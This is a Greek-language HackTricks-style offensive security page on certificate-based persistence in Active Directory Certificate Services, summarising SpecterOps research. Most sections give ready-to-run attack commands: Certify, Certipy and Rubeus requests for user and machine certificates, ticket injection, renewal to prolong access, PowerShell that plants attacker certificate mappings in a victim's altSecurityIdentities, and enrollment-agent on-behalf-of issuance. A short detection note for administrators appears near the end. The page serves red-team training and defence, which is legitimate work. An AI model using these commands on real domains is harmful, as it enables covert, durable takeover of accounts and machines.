# AD CS Διατήρηση λογαριασμού

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια μικρή περίληψη των κεφαλαίων διατήρησης λογαριασμού της εξαιρετικής έρευνας από [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Κατανόηση της κλοπής διαπιστευτηρίων ενεργού χρήστη με πιστοποιητικά – PERSIST1

Σε ένα σενάριο όπου ένα πιστοποιητικό που επιτρέπει την πιστοποίηση/έλεγχο ταυτότητας του domain μπορεί να ζητηθεί από έναν χρήστη, ένας επιτιθέμενος έχει την ευκαιρία να ζητήσει και να κλέψει αυτό το πιστοποιητικό για να διατηρήσει την επίμονη πρόσβαση σε ένα δίκτυο. Από προεπιλογή, το `User` template στο Active Directory επιτρέπει τέτοιες αιτήσεις, αν και κάποιες φορές μπορεί να είναι απενεργοποιημένο.

Χρησιμοποιώντας τα [Certify](https://github.com/GhostPack/Certify) ή [Certipy](https://github.com/ly4k/Certipy), μπορείτε να αναζητήσετε ενεργοποιημένα templates που επιτρέπουν την πιστοποίηση πελάτη και στη συνέχεια να ζητήσετε ένα:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Η δύναμη ενός πιστοποιητικού έγκειται στην ικανότητά του να πραγματοποιεί αυθεντικοποίηση ως ο χρήστης στον οποίο ανήκει, ανεξαρτήτως αλλαγών κωδικού, εφόσον το πιστοποιητικό παραμένει έγκυρο.

Μπορείτε να μετατρέψετε PEM σε PFX και να το χρησιμοποιήσετε για να αποκτήσετε ένα TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Σημείωση: Σε συνδυασμό με άλλες τεχνικές (βλέπε ενότητες THEFT), η πιστοποίηση με πιστοποιητικά επιτρέπει επίμονη πρόσβαση χωρίς να αγγίζει το LSASS και ακόμη και από μη ανυψωμένα περιβάλλοντα.

## Απόκτηση επίμονης παρουσίας στο μηχάνημα με πιστοποιητικά - PERSIST2

Εάν ένας επιτιθέμενος έχει αυξημένα προνόμια σε έναν υπολογιστή, μπορεί να εγγράψει τον λογαριασμό μηχανής του παραβιασμένου συστήματος για ένα πιστοποιητικό χρησιμοποιώντας το προεπιλεγμένο `Machine` template. Η αυθεντικοποίηση ως μηχανή ενεργοποιεί το S4U2Self για τοπικές υπηρεσίες και μπορεί να παρέχει ανθεκτική επίμονη παρουσία στον υπολογιστή:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Επέκταση της Persistence μέσω Certificate Renewal - PERSIST3

Η κατάχρηση των περιόδων validity και renewal των certificate templates επιτρέπει σε έναν attacker να διατηρήσει μακροχρόνια πρόσβαση. Εάν κατέχετε ένα προηγουμένως εκδοθέν certificate και το αντίστοιχο private key, μπορείτε να το renew πριν την expiration για να αποκτήσετε ένα νέο, μακροχρόνιο credential χωρίς να αφήσετε επιπλέον request artifacts συνδεδεμένα με τον original principal.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Συμβουλή λειτουργίας: Παρακολουθήστε τους χρόνους ζωής των αρχείων PFX που κατέχει ο επιτιθέμενος και ανανεώστε νωρίς. Η ανανέωση μπορεί επίσης να προκαλέσει τα ενημερωμένα πιστοποιητικά να περιλαμβάνουν τη σύγχρονη επέκταση SID mapping, διατηρώντας τα λειτουργικά υπό αυστηρότερους κανόνες mapping του DC (βλέπε επόμενη ενότητα).

## Δημιουργία ρητών αντιστοιχίσεων πιστοποιητικών (altSecurityIdentities) – PERSIST4

Αν μπορείτε να γράψετε στο attribute `altSecurityIdentities` ενός λογαριασμού-στόχου, μπορείτε να αντιστοιχίσετε ρητά ένα πιστοποιητικό που ελέγχεται από τον επιτιθέμενο σε αυτόν τον λογαριασμό. Αυτό παραμένει μετά από αλλαγές κωδικού πρόσβασης και, όταν χρησιμοποιούνται ισχυρές μορφές αντιστοίχισης, παραμένει λειτουργικό υπό τη σύγχρονη επιβολή του DC.

Γενική ροή:

1. Αποκτήστε ή εκδώστε ένα client-auth certificate που ελέγχετε (π.χ., εγγράψτε το πρότυπο `User` για τον εαυτό σας).
2. Εξάγετε ένα ισχυρό αναγνωριστικό από το πιστοποιητικό (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Προσθέστε μια ρητή αντιστοίχιση στο `altSecurityIdentities` του principal-θύματος χρησιμοποιώντας αυτό το αναγνωριστικό.
4. Αυθεντικοποιηθείτε με το πιστοποιητικό σας· ο DC το αντιστοιχίζει στον στόχο μέσω της ρητής αντιστοίχισης.

Παράδειγμα (PowerShell) που χρησιμοποιεί ισχυρή αντιστοίχιση Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Στη συνέχεια αυθεντικοποιηθείτε με το PFX σας. Certipy θα λάβει απευθείας ένα TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Δημιουργία ισχυρών αντιστοιχίσεων `altSecurityIdentities`

Στην πράξη, οι αντιστοιχίσεις **Issuer+Serial** και **SKI** είναι οι ευκολότερες ισχυρές μορφές που μπορούν να δημιουργηθούν από ένα πιστοποιητικό που κατέχει ο επιτιθέμενος. Αυτό θα έχει σημασία μετά την **February 11, 2025**, όταν οι DCs θα χρησιμοποιούν ως προεπιλογή το **Full Enforcement** και οι αδύναμες αντιστοιχίσεις θα παύσουν να είναι αξιόπιστες.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Χρησιμοποιείτε μόνο ισχυρούς τύπους αντιστοίχισης: `X509IssuerSerialNumber`, `X509SKI`, ή `X509SHA1PublicKey`. Αδύναμες μορφές (Subject/Issuer, Subject-only, RFC822 email) θεωρούνται παρωχημένες και μπορούν να μπλοκαριστούν από την πολιτική του DC.
- Η αντιστοίχιση λειτουργεί τόσο σε αντικείμενα **user** όσο και **computer**, οπότε η πρόσβαση εγγραφής στο `altSecurityIdentities` ενός computer account είναι αρκετή για να persist ως αυτό το μηχάνημα.
- Η cert chain πρέπει να χτιστεί μέχρι μια root που εμπιστεύεται το DC. Οι Enterprise CAs στο NTAuth συνήθως εμπιστεύονται· ορισμένα περιβάλλοντα εμπιστεύονται επίσης public CAs.
- Η Schannel authentication παραμένει χρήσιμη για persistence ακόμα και όταν το PKINIT αποτύχει επειδή το DC δεν έχει το Smart Card Logon EKU ή επιστρέφει `KDC_ERR_PADATA_TYPE_NOSUPP`.

Για περισσότερα σχετικά με τις αδύναμες ρητές αντιστοιχίσεις και τα attack paths, δείτε:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Ροή κατάχρησης:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Η ανάκληση του agent certificate ή των template permissions απαιτείται για να εκδιωχθεί αυτή η persistence.

Λειτουργικές σημειώσεις
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Επιπτώσεις στην persistence

Microsoft KB5014754 εισήγαγε το Strong Certificate Mapping Enforcement στους domain controllers. Από τις 11 Φεβρουαρίου 2025, οι DCs έχουν ως προεπιλογή το Full Enforcement, απορρίπτοντας αδύνατες/αμφίσημες mappings. Πρακτικές επιπτώσεις:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Οι διαχειριστές πρέπει να παρακολουθούν και να ειδοποιούν για:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## Αναφορές

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
